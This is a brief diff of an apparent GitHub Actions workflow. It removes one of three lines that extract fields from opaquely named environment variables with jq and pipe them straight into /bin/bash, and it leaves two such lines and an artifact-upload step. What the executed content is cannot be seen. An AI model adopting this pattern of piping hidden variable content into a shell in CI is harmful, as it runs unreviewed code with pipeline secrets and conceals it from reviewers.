@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$pys78" | jq -r .pyfu9 | /bin/bash
           echo $ke335 | jq -r .edyw6 | /bin/bash
-          printf '%s' "$ybate7991" | jq -r .hjr218 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
